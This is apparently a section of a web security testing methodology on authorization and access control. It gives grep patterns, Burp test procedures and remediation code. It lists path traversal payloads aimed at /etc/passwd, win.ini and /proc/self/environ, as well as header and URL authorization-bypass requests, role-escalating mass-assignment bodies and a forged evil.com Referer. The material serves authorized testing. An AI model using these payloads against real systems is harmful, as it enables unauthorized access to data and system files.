# Pass 04: Authorization & Access Control

**Weight:** 12% of Security Score
**OWASP Mapping:** A01:2025 (Broken Access Control), WSTG-AUTHZ-01 through WSTG-AUTHZ-04, API1:2023 (BOLA), API5:2023 (BFLA)
**Focus:** Vertical privilege escalation (user-to-admin), horizontal privilege escalation (user A accessing user B's data), IDOR, function-level access control, and authorization bypass techniques. Broken access control is the #1 risk in OWASP 2025 — 100% of tested applications had some form.
**Automation Level:** 40% fully automated, 40% AI-assisted, 20% manual judgment

---

## Tier 0: Static Analysis

### 0.1 Authorization Middleware Detection

Verify that authorization checks exist and are applied consistently across routes.

**Grep patterns:**

```
# Express/Node middleware guards
pattern: (isAuthenticated|isAuthorized|requireAuth|requireRole|authorize|checkPermission|ensureLoggedIn|passport\.authenticate)
glob: "*.{js,ts,mjs}"

# Next.js middleware authorization
pattern: (middleware|getServerSideProps|getSession|useSession|auth\(\))
glob: "**/middleware.{js,ts}"
glob: "**/app/**/page.{js,ts,tsx}"

# RBAC/ABAC patterns
pattern: (role\s*[:=]|permission\s*[:=]|hasRole|hasPermission|can\s*\(|ability|casl|casbin)
glob: "*.{js,ts,mjs}"

# Django authorization
pattern: (@login_required|@permission_required|has_perm|IsAuthenticated|IsAdminUser|DjangoModelPermissions)
glob: "*.py"

# Laravel authorization
pattern: (Gate::|@can|authorize\(|middleware\(['"]auth|Policy|->can\()
glob: "*.php"

# Spring Security
pattern: (@PreAuthorize|@Secured|@RolesAllowed|hasRole|hasAuthority)
glob: "*.java"

# NestJS guards
pattern: (@UseGuards|AuthGuard|RolesGuard|@Roles|CanActivate)
glob: "*.ts"
```

**What to look for:**
- Routes/endpoints that lack authorization middleware
- Inconsistent application of guards across similar endpoints
- Authorization checks only on frontend (not backend)

### 0.2 IDOR Pattern Detection

Identify code patterns that may be vulnerable to Insecure Direct Object References.

**Grep patterns:**

```
# Sequential ID in route params
pattern: (/:id|/\[id\]|params\.id|req\.params\.id|request\.params\[['"]id['"]\])
glob: "*.{js,ts,mjs}"

# Direct database lookup by user-supplied ID without ownership check
pattern: (findById|findOne\(\s*\{?\s*_?id|findByPk|\.get\(\s*id|WHERE\s+id\s*=)
glob: "*.{js,ts,py,php,rb}"

# Missing ownership validation patterns
# Look for routes that use an ID parameter but don't check req.user.id
pattern: (params\.id|params\[['"]id['"]\])
glob: "*.{js,ts,mjs}"

# UUID vs sequential ID usage
pattern: (uuid|uuidv4|crypto\.randomUUID|nanoid)
glob: "*.{js,ts,py,php}"
```

**Critical findings:**
- Database queries that use user-supplied IDs without ownership verification
- Sequential integer IDs exposed in API responses
- No filtering by authenticated user's scope

### 0.3 Route Protection Audit

Map all routes and verify each has appropriate authorization.

**Grep patterns:**

```
# All Express route definitions
pattern: (app|router)\.(get|post|put|patch|delete)\s*\(\s*['"]
glob: "*.{js,ts,mjs}"

# Next.js App Router pages
# Glob: **/app/**/page.{js,ts,tsx}
# Check each for session/auth verification

# API route definitions
# Glob: **/pages/api/**/*.{js,ts}
# Glob: **/app/api/**/*.{js,ts}
# Check each for auth middleware

# Django URL patterns
pattern: (path\(|url\(|re_path\()
glob: "**/urls.py"

# Laravel routes
pattern: Route::(get|post|put|patch|delete)\s*\(
glob: "**/routes/*.php"
```

**Cross-reference:**
- List all routes
- List all routes with auth middleware
- Find routes WITHOUT auth middleware
- Flag any data-modifying endpoint (POST/PUT/PATCH/DELETE) without authorization

### 0.4 Role Definition and Hierarchy

Understand the application's role structure and permission model.

**Grep patterns:**

```
# Role definitions
pattern: (enum.*Role|ROLES\s*=|roles\s*[:=]\s*\[|UserRole|RoleType|role_choices)
glob: "*.{js,ts,py,php,rb,java}"

# Permission definitions
pattern: (enum.*Permission|PERMISSIONS\s*=|permissions\s*[:=]\s*\[|PermissionType)
glob: "*.{js,ts,py,php,rb,java}"

# Admin checks
pattern: (isAdmin|is_admin|role\s*===?\s*['"]admin['"]|user\.role|req\.user\.role)
glob: "*.{js,ts,py,php,rb}"

# Superuser/root checks
pattern: (isSuperUser|is_superuser|superadmin|root_user)
glob: "*.{js,ts,py,php,rb}"
```

---

## Tier 1: Automated Scanning

### 1.1 Vertical Privilege Escalation

**Purpose:** Test if a low-privilege user can access administrative endpoints or perform administrative actions.

**Burp Repeater Workflow:**
1. Log in as a regular user — capture session token / JWT
2. Identify admin-only endpoints from Tier 0 route analysis and Pass 01 reconnaissance
3. Replay each admin endpoint request using the regular user's token

**Test procedure:**
```
# Capture admin endpoints from reconnaissance:
# GET  /admin/dashboard
# GET  /admin/users
# POST /admin/users/create
# PUT  /admin/settings
# DELETE /admin/users/{id}
# GET  /api/admin/reports
# POST /api/admin/config

# For each endpoint:
# 1. Copy the request from Burp
# 2. Replace admin session/token with regular user session/token
# 3. Send via Burp Repeater
# 4. Check if response returns admin data (200 with content = FAIL)
# 5. Expected: 401 Unauthorized or 403 Forbidden
```

**Severity:** Critical if admin functionality is accessible.

### 1.2 Horizontal Privilege Escalation

**Purpose:** Test if User A can access User B's data by manipulating resource identifiers.

**Burp Intruder Workflow:**
1. Log in as User A — capture session token
2. Identify endpoints that return user-specific data
3. Modify resource IDs to access other users' resources

**Test procedure:**
```
# Identify user-specific endpoints:
# GET  /api/users/123/profile
# GET  /api/orders/456
# GET  /api/documents/789
# GET  /api/messages/inbox

# For each endpoint:
# 1. Note User A's resource IDs
# 2. Increment/decrement IDs: 122, 124, 455, 457, etc.
# 3. Try UUID manipulation if UUIDs are used
# 4. Send modified requests with User A's auth token
# 5. Check if other users' data is returned (200 with different user's data = FAIL)
```

**Burp Intruder configuration:**
- Attack type: Sniper
- Payload position: resource ID in URL path
- Payload type: Numbers (sequential range around known ID)
- Rate limit: 5 req/sec max

### 1.3 IDOR Testing

**Purpose:** Systematically test all ID-based endpoints for Insecure Direct Object Reference vulnerabilities.

**Burp Intruder Workflow:**
1. Map all endpoints that accept an ID parameter (from Tier 0)
2. For each endpoint, test with IDs belonging to other users

**ID manipulation strategies:**
```
# Sequential integer IDs
Original: /api/invoices/1042
Test: /api/invoices/1041, /api/invoices/1043, /api/invoices/1

# UUID enumeration (if UUIDs are predictable)
# Check if UUIDs are v1 (time-based, partially predictable)
# vs v4 (random, not predictable)

# Encoded IDs
# Base64 decode the ID, modify, re-encode
# Hex decode the ID, modify, re-encode

# Hash-based IDs
# Check if IDs are MD5/SHA1 hashes of predictable values (email, username)

# Composite keys
# /api/org/5/user/10 → /api/org/5/user/11 (different user in same org)
# /api/org/5/user/10 → /api/org/6/user/10 (same user ID in different org)
```

**Response analysis:**
- Compare response body size and content
- 200 with different user's data = Critical IDOR
- 200 with empty/null data = Potential IDOR (data exists, just empty)
- 403/404 = Properly protected

### 1.4 Function-Level Access Control

**Purpose:** Test all HTTP methods on all discovered endpoints to find missing method-level authorization.

**Burp Intruder Workflow:**
1. For each endpoint, test all HTTP methods
2. Even if GET is protected, PUT/DELETE might not be

**Test matrix:**
```
# For endpoint: /api/users/123
GET    /api/users/123  → Expected: user's own data
POST   /api/users/123  → Expected: 405 or 403
PUT    /api/users/123  → Expected: 403 if not own profile
PATCH  /api/users/123  → Expected: 403 if not own profile
DELETE /api/users/123  → Expected: 403 if not admin
OPTIONS /api/users/123 → Expected: method list

# For endpoint: /api/settings
GET    /api/settings   → Expected: user's own settings
PUT    /api/settings   → Expected: user's own settings (or admin only)
DELETE /api/settings   → Expected: 403 or 405
```

### 1.5 Directory Traversal / Path Traversal

**Purpose:** Test file-related parameters for path traversal vulnerabilities.

**Burp Intruder Workflow:**
1. Identify parameters that reference files (filename, path, template, page, include, file, document)
2. Inject path traversal payloads

**Payload list:**
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd
..\..\..\..\windows\win.ini
....\\....\\....\\windows\\win.ini
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
/proc/self/environ
/proc/self/cmdline
```

**Target parameters:**
```
?file=../../../etc/passwd
?path=../../../etc/passwd
?template=../../../etc/passwd
?page=../../../etc/passwd
?include=../../../etc/passwd
?doc=../../../etc/passwd
?filename=../../../etc/passwd
```

**Severity:** Critical if file content is returned. High if error reveals path information.

### 1.6 Parameter-Based Access Control

**Purpose:** Test if authorization decisions can be manipulated through request parameters.

**Burp Repeater Workflow:**
1. Capture a normal user request
2. Add or modify parameters that might control access level

**Test modifications:**
```
# Add role parameter
POST /api/user/update
{"name": "test", "role": "admin"}

# Modify hidden fields
POST /api/user/update
{"name": "test", "isAdmin": true}

# Add permission flags
POST /api/user/update
{"name": "test", "permissions": ["admin", "superuser"]}

# Mass assignment attempt
POST /api/user/update
{"name": "test", "verified": true, "emailVerified": true, "role": "admin", "active": true}

# Change user ID in body
POST /api/user/update
{"id": 999, "name": "admin_name"}
```

**Also test JSON API variations:**
```
# Array injection
{"role": ["user", "admin"]}

# Nested object
{"user": {"role": "admin"}}

# Type juggling
{"admin": 1}
{"admin": "1"}
{"admin": true}
```

### 1.7 URL-Based Authorization Bypass

**Purpose:** Test if authorization can be bypassed using URL rewriting or override headers.

**Burp Repeater Workflow:**

```
# X-Original-URL bypass (common in some frameworks/reverse proxies)
GET / HTTP/1.1
X-Original-URL: /admin/dashboard

# X-Rewrite-URL bypass
GET / HTTP/1.1
X-Rewrite-URL: /admin/dashboard

# Path traversal in URL
GET /public/../admin/dashboard HTTP/1.1

# Case sensitivity
GET /Admin/Dashboard HTTP/1.1
GET /ADMIN/DASHBOARD HTTP/1.1

# URL encoding
GET /%61%64%6d%69%6e HTTP/1.1

# Double URL encoding
GET /%2561%2564%256d%2569%256e HTTP/1.1

# Trailing characters
GET /admin/dashboard/ HTTP/1.1
GET /admin/dashboard. HTTP/1.1
GET /admin/dashboard..;/ HTTP/1.1
GET /admin/dashboard%00 HTTP/1.1

# HTTP method override
POST /admin/dashboard HTTP/1.1
X-HTTP-Method-Override: GET

# Path parameter injection (Tomcat/Spring)
GET /admin/dashboard;foo=bar HTTP/1.1
GET /admin/..;/admin/dashboard HTTP/1.1
```

### 1.8 Referer-Based Authorization Bypass

**Purpose:** Test if the application relies on the Referer header for authorization decisions.

**Burp Repeater Workflow:**
```
# Access protected resource with forged Referer
GET /admin/sensitive-data HTTP/1.1
Referer: https://{target}/admin/dashboard

# Remove Referer entirely
GET /admin/sensitive-data HTTP/1.1
# (no Referer header)

# Modify Referer to different origin
GET /admin/sensitive-data HTTP/1.1
Referer: https://evil.com/admin/dashboard
```

**Severity:** High if Referer-based access works without proper session validation.

### 1.9 Force Browsing / Direct Object Access

**Purpose:** Test if protected pages and resources can be accessed directly without going through the intended navigation flow.

**Playwright + Burp Workflow:**
1. Map the application's normal navigation flow
2. Attempt to access each authenticated page directly (without logging in)
3. Attempt to access each step in a multi-step process out of order

**Playwright Commands:**
```
# Without authentication, try accessing protected pages directly
browser_navigate → {target}/dashboard
browser_navigate → {target}/profile
browser_navigate → {target}/settings
browser_navigate → {target}/admin
browser_navigate → {target}/api/user/me
browser_navigate → {target}/api/orders

# Check if page content is visible or redirected to login
browser_evaluate → {
  return {
    url: window.location.href,
    title: document.title,
    hasContent: document.body.innerText.length > 100,
    hasLoginForm: !!document.querySelector('input[type="password"]')
  };
}
```

**Burp analysis:** Compare response content when accessing directly vs through normal flow.

### 1.10 Multi-Step Process Authorization Bypass

**Purpose:** Test if authorization checks on multi-step processes can be bypassed by skipping steps.

**Burp Repeater Workflow:**
1. Complete a multi-step process normally, capturing all requests
2. Replay only the final step, skipping intermediate authorization checks

**Common multi-step processes to test:**
```
# E-commerce checkout
# Step 1: Add to cart
# Step 2: Enter shipping
# Step 3: Enter payment  ← skip to here
# Step 4: Confirm order  ← or skip to here with modified price

# Account upgrade
# Step 1: Select plan
# Step 2: Enter payment
# Step 3: Activate   ← skip directly to activation

# Admin action with confirmation
# Step 1: Initiate delete user
# Step 2: Confirm delete   ← skip confirmation
```

**Test each step:**
- Can Step 3 be executed without completing Step 1 and 2?
- Does each step verify the previous step was completed?
- Are step tokens/nonces validated?

---

## Tier 2: AI Judgment

### Question 1: Authorization Model Adequacy
Is the chosen authorization model (RBAC, ABAC, ACL) appropriate for the application's complexity? Are there scenarios where the model breaks down?

### Question 2: Horizontal Access Control Completeness
For every data-accessing endpoint, does the application verify that the authenticated user owns or has permission to access the requested resource? Are there any gaps in the ownership verification pattern?

### Question 3: IDOR Risk Assessment
Based on the ID scheme (sequential integers, UUIDs, slugs), how practical is enumeration? What is the business impact if an attacker accesses other users' data?

### Question 4: Function-Level Authorization Consistency
Are authorization checks consistent across all HTTP methods for each endpoint? Are there endpoints where GET is protected but POST/PUT/DELETE are not (or vice versa)?

### Question 5: Privilege Escalation Paths
Based on the role hierarchy and permission model, are there any logical paths where a lower-privilege user could escalate to higher privileges through a sequence of legitimate operations?

### Question 6: Mass Assignment Risk
Does the application properly restrict which fields can be set through user input? Are ORM-level protections in place (allowlists vs blocklists for assignable attributes)?

### Question 7: Context-Dependent Access Control
Are there resources where access depends on context (time, location, workflow state) that might not be properly enforced? For example, can an expired invitation still be used?

### Question 8: API vs UI Authorization Parity
Are authorization checks equally enforced on the API layer as they are on the UI layer? Could an attacker bypass UI restrictions by calling APIs directly?

---

## Severity Classification

### Critical
- Admin functionality accessible by regular users (vertical escalation)
- User data accessible by other users without restriction (horizontal escalation)
- Path traversal returning sensitive system files (/etc/passwd, win.ini)
- Mass assignment allowing role escalation to admin
- Complete authorization bypass via URL manipulation
- Multi-step process bypass leading to financial impact

### High
- IDOR on sensitive data (personal info, financial records, medical data)
- Function-level access control missing on data-modifying endpoints
- Parameter-based role escalation partially successful
- Referer-based authorization bypass
- Directory traversal revealing application source code
- Force browsing to authenticated-only content

### Medium
- IDOR on non-sensitive data (public profiles, non-critical settings)
- Missing authorization on read-only endpoints
- Inconsistent HTTP method authorization
- Mass assignment on non-critical fields
- URL-based bypass requiring specific framework knowledge
- Multi-step process bypass on non-critical workflows

### Low
- IDOR possible but returns empty/null data
- Authorization errors revealing resource existence
- Verbose 403 messages hinting at authorization model
- Non-exploitable path traversal (error without file content)
- Overly permissive CORS on public-read endpoints

---

## False Positive Indicators

1. **Public resources** — Some endpoints are intentionally public (public profiles, product listings, documentation). Verify the resource should be protected before flagging.
2. **Self-referencing IDOR** — Accessing `/api/users/123` when you ARE user 123 is not an IDOR. The vulnerability is accessing other users' data.
3. **Admin testing with admin token** — If testing with an admin token, accessing admin endpoints is expected behavior. Use a regular user token.
4. **Shared resources** — Some resources (shared documents, team projects) are intentionally accessible by multiple users. Verify the sharing model.
5. **Rate-limited responses** — Getting 429 during enumeration testing is the rate limiter working correctly, not a vulnerability.
6. **Cached responses** — Some 200 responses may be cached and don't reflect actual authorization checks. Clear cache and retest.
7. **GraphQL field-level permissions** — A query returning `null` for restricted fields may indicate proper field-level authorization even though the query itself succeeds.
8. **Multi-tenant isolation** — In multi-tenant apps, accessing resources in your own tenant is expected. Cross-tenant access is the vulnerability.

---

## Remediation

### Authorization Middleware Pattern
```javascript
// Express middleware pattern for authorization
const authorize = (...roles) => {
  return (req, res, next) => {
    if (!req.user) return res.status(401).json({ error: 'Not authenticated' });
    if (!roles.includes(req.user.role)) return res.status(403).json({ error: 'Insufficient permissions' });
    next();
  };
};

// Apply to routes
app.get('/admin/users', authorize('admin'), adminController.listUsers);
app.delete('/admin/users/:id', authorize('admin'), adminController.deleteUser);
```

### IDOR Prevention
```javascript
// Always filter by authenticated user's scope
const getOrder = async (req, res) => {
  const order = await Order.findOne({
    where: {
      id: req.params.id,
      userId: req.user.id  // CRITICAL: scope to authenticated user
    }
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  return res.json(order);
};
```

### Mass Assignment Protection
```javascript
// Prisma — select only allowed fields
const updatedUser = await prisma.user.update({
  where: { id: req.user.id },
  data: {
    name: req.body.name,
    email: req.body.email,
    // DO NOT spread req.body — prevents role/admin injection
  },
  select: { id: true, name: true, email: true }
});

// Zod schema for input validation
const updateUserSchema = z.object({
  name: z.string().max(100).optional(),
  email: z.string().email().optional(),
  // role, isAdmin, etc. are NOT in the schema
});
```

### Use UUIDs Instead of Sequential IDs
```javascript
// Prisma schema
model User {
  id String @id @default(uuid())
  // ...
}

// Or use cuid2/nanoid for shorter, URL-safe IDs
import { createId } from '@paralleldrive/cuid2';
const id = createId();
```

### Policy-Based Authorization (CASL/Casbin)
```javascript
// CASL example
import { AbilityBuilder, createMongoAbility } from '@casl/ability';

function defineAbilitiesFor(user) {
  const { can, cannot, build } = new AbilityBuilder(createMongoAbility);

  if (user.role === 'admin') {
    can('manage', 'all');
  } else {
    can('read', 'Post', { published: true });
    can('read', 'Post', { authorId: user.id });
    can('update', 'Post', { authorId: user.id });
    can('delete', 'Post', { authorId: user.id });
    cannot('update', 'Post', ['role', 'isAdmin']); // Protect sensitive fields
  }

  return build();
}
```
